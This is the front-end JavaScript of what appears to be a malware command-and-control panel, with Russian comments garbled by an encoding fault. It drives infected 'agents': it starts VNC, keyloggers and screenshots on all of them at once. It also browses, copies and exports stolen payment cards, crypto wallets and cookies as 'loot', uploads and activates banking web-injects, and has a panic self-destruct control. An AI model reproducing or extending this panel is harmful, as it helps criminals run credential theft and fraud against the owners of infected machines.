    document.querySelector('.metric-card .value').textContent = data.total_agents;
    document.querySelectorAll('.metric-card .value')[1].textContent = data.active_agents;
    document.querySelectorAll('.metric-card .value')[2].textContent = data.total_logs;
    document.querySelectorAll('.metric-card .value')[3].textContent = data.total_files;
    // --- Pie/Doughnut –ø–æ –∫–∞—Ç–µ–≥–æ—Ä–∏—è–º —Ñ–∞–π–ª–æ–≤ ---
    const pieCtx = document.getElementById('metrics-pie').getContext('2d');
    if(pieChart) pieChart.destroy();
    pieChart = new Chart(pieCtx, {
        type: 'doughnut',
        data: {
            labels: Object.keys(data.files_by_category),
            datasets: [{
                data: Object.values(data.files_by_category),
                backgroundColor: [
                    '#00ffe7','#ff00e7','#ffe700','#00ff6a','#ff4e4e'
                ],
                borderWidth: 2,
                borderColor: '#181c24',
                hoverOffset: 16
            }]
        },
        options: {
            plugins: {
                legend: { labels: { color: '#00ffe7', font: {weight:'bold'} } },
                tooltip: { enabled: true }
            },
            animation: { animateRotate: true, animateScale: true },
            cutout: '60%'
        }
    });
    // --- Bar –ø–æ –∫–∞—Ç–µ–≥–æ—Ä–∏—è–º —Ñ–∞–π–ª–æ–≤ ---
    const barCtx = document.getElementById('metrics-bar').getContext('2d');
    if(barChart) barChart.destroy();
    barChart = new Chart(barCtx, {
        type: 'bar',
        data: {
            labels: Object.keys(data.files_by_category),
            datasets: [{
                label: '–§–∞–π–ª—ã –ø–æ –∫–∞—Ç–µ–≥–æ—Ä–∏—è–º',
                data: Object.values(data.files_by_category),
                backgroundColor: [
                    '#00ffe7','#ff00e7','#ffe700','#00ff6a','#ff4e4e'
                ],
                borderRadius: 8,
                borderSkipped: false
            }]
        },
        options: {
            plugins: { legend: { display: false } },
            scales: {
                x: { ticks: { color: '#00ffe7', font:{weight:'bold'} } },
                y: { ticks: { color: '#00ffe7', font:{weight:'bold'} }, beginAtZero:true }
            },
            animation: { duration: 1200, easing: 'easeOutElastic' }
        }
    });
    // --- Radial (progress) –ø–æ –∞–∫—Ç–∏–≤–Ω—ã–º –∞–≥–µ–Ω—Ç–∞–º ---
    const radialCtx = document.getElementById('metrics-radial').getContext('2d');
    if(radialChart) radialChart.destroy();
    radialChart = new Chart(radialCtx, {
        type: 'doughnut',
        data: {
            labels: ['–û–Ω–ª–∞–π–Ω', '–û—Ñ—Ñ–ª–∞–π–Ω'],
            datasets: [{
                data: [data.active_agents, data.total_agents-data.active_agents],
                backgroundColor: ['#00ffe7','#232b36'],
                borderWidth: 2,
                borderColor: '#181c24',
                hoverOffset: 12
            }]
        },
        options: {
            plugins: {
                legend: { display: false },
                tooltip: { enabled: true }
            },
            cutout: '80%',
            animation: { animateRotate: true, animateScale: true }
        }
    });
    // --- –¢–æ–ø-–∞–≥–µ–Ω—Ç—ã ---
    const topList = document.getElementById('top-agents-list');
    topList.innerHTML = '';
    data.top_agents.forEach(a => {
        const li = document.createElement('li');
        li.innerHTML = `<span style='color:#00ffe7;font-weight:bold;'>${a.agent_id}</span> <span style='color:#aaa;'>(${a.files} —Ñ–∞–π–ª–æ–≤)</span>`;
        topList.appendChild(li);
    });
    // --- –°—Ç–∞—Ç—É—Å –º–æ–¥—É–ª–µ–π ---
    const modulesList = document.getElementById('modules-status-list');
    modulesList.innerHTML = '';
    Object.entries(data.modules_status).forEach(([mod, status]) => {
        const color = status==='online' ? '#00ff6a' : '#ff4e4e';
        const glow = status==='online' ? '0 0 12px #00ff6a' : '0 0 12px #ff4e4e';
        const icon = mod==='VNC' ? 'fa-desktop' : (mod==='Keylogger' ? 'fa-keyboard' : 'fa-image');
        modulesList.innerHTML += `<li style='margin-bottom:0.3em;'><i class='fa-solid ${icon}' style='color:${color};filter:drop-shadow(${glow});margin-right:0.5em;'></i><span style='color:${color};font-weight:bold;text-shadow:${glow};'>${mod}</span> <span style='color:#aaa;'>${status}</span></li>`;
    });
    // --- –ê–∫—Ç–∏–≤–Ω—ã–µ –∞—Ç–∞–∫–∏ ---
    const attacksList = document.getElementById('active-attacks-list');
    attacksList.innerHTML = '';
    data.active_attacks.forEach(a => {
        const color = a.status==='running' ? '#ffe700' : '#00ff6a';
        attacksList.innerHTML += `<li style='margin-bottom:0.3em;'><i class='fa-solid fa-bolt' style='color:${color};margin-right:0.5em;'></i><span style='color:${color};font-weight:bold;'>${a.type}</span> <span style='color:#aaa;'>–Ω–∞</span> <span style='color:#00ffe7;'>${a.target}</span> <span style='color:#aaa;'>[${a.status}]</span></li>`;
    });
    // --- –ú–∏–Ω–∏-–∫–∞—Ä—Ç–∞ (–¥–µ–º–æ, —Å–ª—É—á–∞–π–Ω—ã–µ —Ç–æ—á–∫–∏) ---
    const minimap = document.getElementById('minimap-canvas');
    const ctx = minimap.getContext('2d');
    ctx.clearRect(0,0,200,120);
    for(let i=0;i<data.total_agents;i++){
        ctx.beginPath();
        ctx.arc(30+Math.random()*140,30+Math.random()*60,10,0,2*Math.PI);
        ctx.fillStyle = '#00ffe7cc';
        ctx.shadowColor = '#00ffe7';
        ctx.shadowBlur = 16;
        ctx.fill();
        ctx.shadowBlur = 0;
    }
}
window.loadMetrics = loadMetrics;

// --- –£–≤–µ–¥–æ–º–ª–µ–Ω–∏—è ---
function showToast(msg) {
    let toast = document.createElement('div');
    toast.textContent = msg;
    toast.style.position = 'fixed';
    toast.style.bottom = '2em';
    toast.style.right = '2em';
    toast.style.background = '#00ffe7';
    toast.style.color = '#181c24';
    toast.style.padding = '1em 2em';
    toast.style.borderRadius = '8px';
    toast.style.fontWeight = 'bold';
    toast.style.zIndex = 9999;
    document.body.appendChild(toast);
    setTimeout(() => toast.remove(), 2500);
}

// --- –í—Å–ø–æ–º–æ–≥–∞—Ç–µ–ª—å–Ω—ã–µ ---
function formatTime(ts) {
    if(!ts) return '';
    const d = new Date(ts*1000);
    return d.toLocaleString();
}

// --- –£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –∞–≥–µ–Ω—Ç–∞–º–∏ ---
document.querySelector('#agents-table').addEventListener('click', async e => {
    const tr = e.target.closest('tr');
    if(!tr) return;
    const agent_id = tr.children[0].textContent;
    if(e.target.closest('[title="VNC"]')) {
        const res = await fetch(`/api/agent/${agent_id}/vnc`, {method:'POST'});
        const data = await res.json();
        showToast(data.message || 'VNC –∞–∫—Ç–∏–≤–∏—Ä–æ–≤–∞–Ω');
    }
    if(e.target.closest('[title="–°–∫—Ä–∏–Ω—à–æ—Ç"]')) {
        const res = await fetch(`/api/agent/${agent_id}/screenshot`, {method:'POST'});
        const data = await res.json();
        showToast(data.success ? '–°–∫—Ä–∏–Ω—à–æ—Ç —Å–¥–µ–ª–∞–Ω' : (data.error || '–û—à–∏–±–∫–∞ —Å–∫—Ä–∏–Ω—à–æ—Ç–∞'));
    }
    if(e.target.closest('[title="–§–∞–π–ª—ã"]')) {
        // –§–∏–ª—å—Ç—Ä–æ–≤–∞—Ç—å —Ñ–∞–π–ª—ã –ø–æ –∞–≥–µ–Ω—Ç—É
        document.getElementById('agent-search').value = agent_id;
        tabs.forEach(t => t.classList.remove('active'));
        tabContents.forEach(tc => tc.classList.remove('active'));
        document.querySelector('.tab[data-tab="files"]').classList.add('active');
        document.getElementById('tab-files').classList.add('active');
        loadFiles();
    }
    if(e.target.closest('[title="–û—Ç–∫—Ä—ã—Ç—å —á–∞—Ç"]')) {
        window.location = `/agent/${agent_id}/chat`;
    }
    if(e.target.closest('[title="VNC"]')) e.preventDefault();
});
// –ú–∞—Å—Å–æ–≤—ã–µ –¥–µ–π—Å—Ç–≤–∏—è —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è (VNC, –∫–µ–π–ª–æ–≥–≥–µ—Ä, screenshot)
document.querySelector('#tab-control').addEventListener('click', async e => {
    if(e.target.closest('.action-btn')) {
        let action = e.target.closest('.action-btn').textContent.trim();
        let agents = Array.from(document.querySelectorAll('#agents-table tbody tr')).map(tr => tr.children[0].textContent);
        if(action.includes('VNC')) {
            for(const agent_id of agents) {
                await fetch(`/api/agent/${agent_id}/vnc`, {method:'POST'});
            }
            showToast('VNC –∞–∫—Ç–∏–≤–∏—Ä–æ–≤–∞–Ω –Ω–∞ –≤—Å–µ—Ö');
        }
        if(action.includes('–∫–µ–π–ª–æ–≥–≥–µ—Ä')) {
            for(const agent_id of agents) {
                await fetch(`/api/agent/${agent_id}/keylogger`, {method:'POST'});
            }
            showToast('–ö–µ–π–ª–æ–≥–≥–µ—Ä –∞–∫—Ç–∏–≤–∏—Ä–æ–≤–∞–Ω –Ω–∞ –≤—Å–µ—Ö');
        }
        if(action.includes('–°–∫—Ä–∏–Ω—à–æ—Ç')) {
            for(const agent_id of agents) {
                await fetch(`/api/agent/${agent_id}/screenshot`, {method:'POST'});
            }
            showToast('–°–∫—Ä–∏–Ω—à–æ—Ç—ã —Å–¥–µ–ª–∞–Ω—ã');
        }
        if(action.includes('–ò–Ω—ä–µ–∫—Ü–∏—è')) {
            showToast('–ò–Ω—ä–µ–∫—Ü–∏—è: —Ñ—É–Ω–∫—Ü–∏—è –≤ —Ä–∞–∑—Ä–∞–±–æ—Ç–∫–µ');
        }
    }
});

// --- WebSocket live updates ---
let ws = null;
function connectWS() {
    ws = new WebSocket((location.protocol==='https:'?'wss':'ws')+'://'+location.host+'/ws/dashboard');
    const wsStatus = document.getElementById('ws-status');
    ws.onopen = () => { wsStatus.classList.remove('offline'); wsStatus.innerHTML = '<span class="ws-dot"></span> LIVE'; };
    ws.onclose = () => { wsStatus.classList.add('offline'); wsStatus.innerHTML = '<span class="ws-dot"></span> OFFLINE'; setTimeout(connectWS, 3000); };
    ws.onerror = () => { ws.close(); };
    ws.onmessage = e => {
        let event = {};
        try { event = JSON.parse(e.data); } catch { return; }
        if(event.type === 'file' && event.action === 'add') {
            // –î–æ–±–∞–≤–∏—Ç—å —Å—Ç—Ä–æ–∫—É –≤ —Ç–∞–±–ª–∏—Ü—É —Ñ–∞–π–ª–æ–≤ —Å –∞–Ω–∏–º–∞—Ü–∏–µ–π
            if(document.getElementById('tab-files').classList.contains('active')) {
                const tbody = document.querySelector('#files-table tbody');
                const tr = document.createElement('tr');
                tr.classList.add('new-row');
                tr.innerHTML = `
                    <td><input type='checkbox' class='file-checkbox' data-id='${event.file.file_id}'></td>
                    <td>${event.file.name}</td>
                    <td>${event.file.agent_id}</td>
                    <td>${event.file.size}</td>
                    <td>${event.file.category}</td>
                    <td>${formatTime(event.file.timestamp)}</td>
                    <td>
                        <button class='action-btn' title='–°–∫–∞—á–∞—Ç—å' onclick='downloadFile("${event.file.file_id}")'><i class='fa-solid fa-download'></i></button>
                        <button class='action-btn' title='–£–¥–∞–ª–∏—Ç—å' onclick='deleteFiles(["${event.file.file_id}"])'><i class='fa-solid fa-trash'></i></button>
                    </td>
                `;
                tbody.prepend(tr);
                setTimeout(()=>tr.classList.remove('new-row'), 2000);
            }
            // –û–±–Ω–æ–≤–∏—Ç—å –≥—Ä–∞—Ñ–∏–∫–∏ –∏ –º–µ—Ç—Ä–∏–∫–∏
            loadMetrics();
        }
        // –ú–æ–∂–Ω–æ –¥–æ–±–∞–≤–∏—Ç—å –æ–±—Ä–∞–±–æ—Ç–∫—É –¥—Ä—É–≥–∏—Ö —Ç–∏–ø–æ–≤ —Å–æ–±—ã—Ç–∏–π (–ª–æ–≥, –∞—Ç–∞–∫–∞, —Å—Ç–∞—Ç—É—Å)
    };
}
connectWS();

// --- –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è ---
if(document.querySelector('.tab.active').dataset.tab === 'files') loadFiles();
if(document.querySelector('.tab.active').dataset.tab === 'logs') loadLogs();
if(document.querySelector('.tab.active').dataset.tab === 'metrics') loadMetrics();

// --- –õ—É—Ç ---
async function loadLoot() {
    const search = document.getElementById('loot-search').value.toLowerCase();
    const type = document.getElementById('loot-type-filter').value;
    // –ü–æ–ª—É—á–∞–µ–º –≤—Å–µ —Ç–∏–ø—ã –ª—É—Ç–∞
    const [cards, wallets, cookies] = await Promise.all([
        fetch('/api/loot/cards').then(r=>r.json()).then(d=>d.cards||[]),
        fetch('/api/loot/wallets').then(r=>r.json()).then(d=>d.wallets||[]),
        fetch('/api/loot/cookies').then(r=>r.json()).then(d=>d.cookies||[])
    ]);
    let loot = [];
    loot = loot.concat(cards.map(l=>({...l, _type:'card'})));
    loot = loot.concat(wallets.map(l=>({...l, _type:'wallet'})));
    loot = loot.concat(cookies.map(l=>({...l, _type:'cookie'})));
    // –§–∏–ª—å—Ç—Ä–∞—Ü–∏—è
    loot = loot.filter(l => {
        if(type && l._type!==type) return false;
        if(search) {
            const val = (l.card||l.wallet||l.cookie||'')+','+(l.agent_id||'')+','+(l.tags||'')+','+(l.notes||'');
            if(!val.toLowerCase().includes(search)) return false;
        }
        return true;
    });
    // –°–æ—Ä—Ç–∏—Ä–æ–≤–∫–∞ –ø–æ –≤—Ä–µ–º–µ–Ω–∏ (–Ω–æ–≤—ã–µ —Å–≤–µ—Ä—Ö—É)
    loot.sort((a,b)=>b.timestamp-a.timestamp);
    // –†–µ–Ω–¥–µ—Ä
    const tbody = document.querySelector('#loot-table tbody');
    tbody.innerHTML = '';
    loot.forEach(l => {
        const tr = document.createElement('tr');
        tr.classList.add('new-row');
        tr.innerHTML = `
            <td>${l._type==='card'?'üí≥':l._type==='wallet'?'ü™ô':'üç™'}</td>
            <td style="font-family:monospace;">${l.card||l.wallet||l.cookie}</td>
            <td>${l.agent_id}</td>
            <td>${formatTime(l.timestamp)}</td>
            <td contenteditable="true">${l.tags||''}</td>
            <td contenteditable="true">${l.notes||''}</td>
            <td>
                <button class="action-btn" title="–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å" onclick="navigator.clipboard.writeText('${l.card||l.wallet||l.cookie}')"><i class="fa-solid fa-copy"></i></button>
                <button class="action-btn" title="–°–∫–∞—á–∞—Ç—å"><i class="fa-solid fa-download"></i></button>
            </td>
        `;
        tbody.appendChild(tr);
        setTimeout(()=>tr.classList.remove('new-row'), 2000);
    });
    ensureTableNotEmpty('loot-table');
}
document.getElementById('loot-search').addEventListener('input', loadLoot);
document.getElementById('loot-type-filter').addEventListener('change', loadLoot);
document.getElementById('loot-collect-all').addEventListener('click', ()=>{
    showToast('–°–±–æ—Ä –ª—É—Ç–∞ —Å–æ –≤—Å–µ—Ö –∞–≥–µ–Ω—Ç–æ–≤ –∑–∞–ø—É—â–µ–Ω (–∑–∞–≥–ª—É—à–∫–∞)');
});
window.loadLoot = loadLoot;

// --- Web-injects ---
async function loadInjects() {
    const res = await fetch('/api/injects/list');
    const data = await res.json();
    const tbody = document.querySelector('#injects-table tbody');
    tbody.innerHTML = '';
    data.injects.forEach(inj => {
        const tr = document.createElement('tr');
        tr.classList.add('new-row');
        tr.innerHTML = `
            <td>${inj.name}</td>
            <td>${formatTime(inj.uploaded)}</td>
            <td>${inj.active?'<span style=\'color:#00ff6a;font-weight:bold;\'>–ê–∫—Ç–∏–≤–µ–Ω</span>':'<span style=\'color:#aaa;\'>–ù–µ–∞–∫—Ç–∏–≤–µ–Ω</span>'}</td>
            <td>${inj.stats && Object.keys(inj.stats).length ? JSON.stringify(inj.stats) : '-'}</td>
            <td>
                <button class="action-btn" onclick="activateInject('${inj.id}')"><i class="fa-solid fa-bolt"></i> –ê–∫—Ç–∏–≤–∏—Ä–æ–≤–∞—Ç—å</button>
            </td>
        `;
        tbody.appendChild(tr);
        setTimeout(()=>tr.classList.remove('new-row'), 2000);
    });
    ensureTableNotEmpty('injects-table');
}
window.loadInjects = loadInjects;
async function activateInject(id) {
    await fetch('/api/injects/activate', {method:'POST',body:new URLSearchParams({inject_id:id})});
    showToast('–ò–Ω—ä–µ–∫—Ü–∏—è –∞–∫—Ç–∏–≤–∏—Ä–æ–≤–∞–Ω–∞');
    loadInjects();
}
document.getElementById('inject-upload').addEventListener('change', async e => {
    for(const file of e.target.files) {
        const form = new FormData();
        form.append('file', file);
        await fetch('/api/injects/upload', {method:'POST',body:form});
        showToast('–ò–Ω—ä–µ–∫—Ü–∏—è –∑–∞–≥—Ä—É–∂–µ–Ω–∞');
    }
    loadInjects();
});

// --- –í–∏–¥–∂–µ—Ç—ã —Ç–æ–ø-–ª—É—Ç/—Å–≤–µ–∂–∏–µ –∫–∞—Ä—Ç—ã/–∫–æ—à–µ–ª—å–∫–∏ ---
async function loadLootWidgets() {
    const res = await fetch('/api/metrics');
    const data = await res.json();
    // –¢–æ–ø-–∞–≥–µ–Ω—Ç—ã –ø–æ –ª—É—Ç—É
    const topList = document.getElementById('top-loot-agents-list');
    topList.innerHTML = '';
    (data.top_loot_agents||[]).forEach(a => {
        const li = document.createElement('li');
        li.innerHTML = `<span style='color:#ffe700;font-weight:bold;'>${a.agent_id}</span> <span style='color:#aaa;'>(${a.loot} –ª—É—Ç–∞)</span>`;
        topList.appendChild(li);
    });
    // –°–≤–µ–∂–∏–µ –∫–∞—Ä—Ç—ã
    const cardsList = document.getElementById('fresh-cards-list');
    cardsList.innerHTML = '';
    (data.fresh_cards||[]).forEach(c => {
        cardsList.innerHTML += `<li style='margin-bottom:0.3em;'><span style='color:#00ffe7;font-family:monospace;'>${c.card}</span> <span style='color:#aaa;'>${formatTime(c.timestamp)}</span></li>`;
    });
    // –°–≤–µ–∂–∏–µ –∫–æ—à–µ–ª—å–∫–∏
    const walletsList = document.getElementById('fresh-wallets-list');
    walletsList.innerHTML = '';
    (data.fresh_wallets||[]).forEach(w => {
        walletsList.innerHTML += `<li style='margin-bottom:0.3em;'><span style='color:#00ff6a;font-family:monospace;'>${w.wallet}</span> <span style='color:#aaa;'>${formatTime(w.timestamp)}</span></li>`;
    });
}
window.loadLootWidgets = loadLootWidgets;

// --- –ú–∏–Ω–∏-–∫–∞—Ä—Ç–∞ –∑–∞—Ä–∞–∂—ë–Ω–Ω—ã—Ö —Å–∏—Å—Ç–µ–º (–¥–µ–º–æ) ---
function drawMinimap() {
    const minimap = document.getElementById('minimap-canvas');
    if(!minimap) return;
    const ctx = minimap.getContext('2d');
    ctx.clearRect(0,0,200,120);
    for(let i=0;i<8;i++){
        ctx.beginPath();
        ctx.arc(30+Math.random()*140,30+Math.random()*60,10,0,2*Math.PI);
        ctx.fillStyle = '#00ffe7cc';
        ctx.shadowColor = '#00ffe7';
        ctx.shadowBlur = 16;
        ctx.fill();
        ctx.shadowBlur = 0;
    }
}
window.drawMinimap = drawMinimap;

// --- AI Decisions (reasoning-–ª–æ–≥–∏–∫–∞, –¥–µ–º–æ) ---
function loadAIDecisions() {
    const log = document.getElementById('ai-decisions-log');
    log.innerHTML = '';
    const demo = [
        '[AI] –ù–µ—Ç reasoning-–¥–∞–Ω–Ω—ã—Ö. –û–∂–∏–¥–∞–Ω–∏–µ –¥–µ–π—Å—Ç–≤–∏–π –∞–≥–µ–Ω—Ç–∞...'
    ];
    demo.forEach(line => {
        const div = document.createElement('div');
        div.textContent = line;
        log.appendChild(div);
    });
}
window.loadAIDecisions = loadAIDecisions;

// --- –í–∫–ª–∞–¥–∫–∏ ---
document.querySelectorAll('.tab').forEach(tab => {
    tab.addEventListener('click', () => {
        if(tab.dataset.tab==='loot') loadLoot();
        if(tab.dataset.tab==='injects') loadInjects();
        if(tab.dataset.tab==='ai') { loadLootWidgets(); loadAIDecisions(); drawMinimap(); }
    });
});
// –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è
if(document.querySelector('.tab.active').dataset.tab==='loot') loadLoot();
if(document.querySelector('.tab.active').dataset.tab==='injects') loadInjects();
if(document.querySelector('.tab.active').dataset.tab==='ai') { loadLootWidgets(); loadAIDecisions(); drawMinimap(); }

// --- –¢–µ–º—ã ---
document.getElementById('theme-select').addEventListener('change', e => {
    document.body.className = e.target.value ? 'theme-'+e.target.value : '';
});

// --- Panic mode ---
document.getElementById('panic-btn').addEventListener('click', ()=>{
    showToast('Panic mode –∞–∫—Ç–∏–≤–∏—Ä–æ–≤–∞–Ω! –í—Å–µ –∞–≥–µ–Ω—Ç—ã –ø–æ–ª—É—á–∞—Ç –∫–æ–º–∞–Ω–¥—É self-destruct (–∑–∞–≥–ª—É—à–∫–∞)');
});

// --- –≠–∫—Å–ø–æ—Ä—Ç –ª—É—Ç–∞ ---
function exportLoot(format) {
    const rows = Array.from(document.querySelectorAll('#loot-table tbody tr'));
    let data = rows.map(tr => {
        const tds = tr.querySelectorAll('td');
        return {
            type: tds[0].textContent,
            value: tds[1].textContent,
            agent: tds[2].textContent,
            time: tds[3].textContent,
            tags: tds[4].textContent,
            notes: tds[5].textContent
        };
    });
    if(format==='csv') {
        let csv = 'type,value,agent,time,tags,notes\n'+data.map(d=>`${d.type},${d.value},${d.agent},${d.time},${d.tags},${d.notes}`).join('\n');
        downloadFileContent(csv, 'loot.csv', 'text/csv');
    } else if(format==='json') {
        downloadFileContent(JSON.stringify(data,null,2), 'loot.json', 'application/json');
    } else if(format==='txt') {
        let txt = data.map(d=>`${d.type}: ${d.value} | ${d.agent} | ${d.time} | ${d.tags} | ${d.notes}`).join('\n');
        downloadFileContent(txt, 'loot.txt', 'text/plain');
    }
}
function downloadFileContent(content, filename, mime) {
    const blob = new Blob([content], {type: mime});
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url; a.download = filename; a.click();
    setTimeout(()=>URL.revokeObjectURL(url), 1000);
}
document.getElementById('loot-export-csv').addEventListener('click', ()=>exportLoot('csv'));
document.getElementById('loot-export-json').addEventListener('click', ()=>exportLoot('json'));
document.getElementById('loot-export-txt').addEventListener('click', ()=>exportLoot('txt'));
document.getElementById('loot-send-telegram').addEventListener('click', ()=>{
    showToast('–õ—É—Ç –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω –≤ Telegram (–∑–∞–≥–ª—É—à–∫–∞, –∏–Ω—Ç–µ–≥—Ä–∞—Ü–∏—è —á–µ—Ä–µ–∑ –±–æ—Ç–∞)');
});

// --- –ó–∞–≥–ª—É—à–∫–∏ –¥–ª—è –ø—É—Å—Ç—ã—Ö —Ç–∞–±–ª–∏—Ü ---
function ensureTableNotEmpty(tableId) {
    const tbody = document.querySelector(`#${tableId} tbody`);
    if(tbody && tbody.children.length === 0) {
        const tr = document.createElement('tr');
        const td = document.createElement('td');
        td.colSpan = tbody.parentElement.querySelectorAll('th').length;
        td.style.textAlign = 'center';
        td.style.color = '#888';
        td.textContent = '–ù–µ—Ç –¥–∞–Ω–Ω—ã—Ö';
        tr.appendChild(td);
        tbody.appendChild(tr);
    }
}

// --- –ü–µ—Ä–µ–æ–ø—Ä–µ–¥–µ–ª–∏—Ç—å load-—Ñ—É–Ω–∫—Ü–∏–∏ –¥–ª—è –∑–∞–≥–ª—É—à–µ–∫ ---
const origLoadLoot = window.loadLoot;
window.loadLoot = async function() { await origLoadLoot(); ensureTableNotEmpty('loot-table'); };
const origLoadInjects = window.loadInjects;
window.loadInjects = async function() { await origLoadInjects(); ensureTableNotEmpty('injects-table'); };
const origLoadFiles = window.loadFiles;
window.loadFiles = async function() { await origLoadFiles(); ensureTableNotEmpty('files-table'); };
const origLoadLogs = window.loadLogs;
window.loadLogs = async function() { await origLoadLogs(); ensureTableNotEmpty('logs-table'); };
const origLoadAgents = function() {
    // –ï—Å–ª–∏ –µ—Å—Ç—å —Ñ—É–Ω–∫—Ü–∏—è –∑–∞–≥—Ä—É–∑–∫–∏ –∞–≥–µ–Ω—Ç–æ–≤ ‚Äî –¥–æ–±–∞–≤–∏—Ç—å –∑–∞–≥–ª—É—à–∫—É
    ensureTableNotEmpty('agents-table');
};
window.loadAgents = origLoadAgents;

function showReasoningModal(agentId) {
    const modal = document.getElementById('reasoning-modal');
    const content = document.getElementById('reasoning-content');
    modal.style.display = 'flex';
    content.innerHTML = '<div style="text-align:center; color:#aaa;">–ó–∞–≥—Ä—É–∑–∫–∞...</div>';
    fetch(`/api/agent/${agentId}/reasoning`, {method: 'POST'})
        .then(r => r.json())
        .then(data => {
            if (data.status === 'success') {
                let html = '';
                html += '<h3>–†–µ–∫–æ–º–µ–Ω–¥–∞—Ü–∏–∏:</h3><ul>';
                for (const rec of data.recommendations) {
                    html += `<li>${rec}</li>`;
                }
                html += '</ul>';
                html += '<h4>Reasoning-–ª–æ–≥–∏:</h4><div style="max-height:180px; overflow:auto; background:#181c24; border-radius:6px; padding:0.7em; font-size:0.97em;">';
                for (const log of data.reasoning_logs) {
                    html += `<div><span style=\"color:#00ffe7;\">[${log.timestamp}]</span> <b>${log.type}</b>: ${log.message}</div>`;
                }
                html += '</div>';
                content.innerHTML = html;
            } else {
                content.innerHTML = `<div style='color:#ff4e4e;'>–û—à–∏–±–∫–∞: ${data.message}</div>`;
            }
        })
        .catch(e => {
            content.innerHTML = `<div style='color:#ff4e4e;'>–û—à–∏–±–∫–∞ –∑–∞–ø—Ä–æ—Å–∞: ${e}</div>`;
        });
}
function closeReasoningModal() {
    document.getElementById('reasoning-modal').style.display = 'none';
}
</script>
{% endblock %} 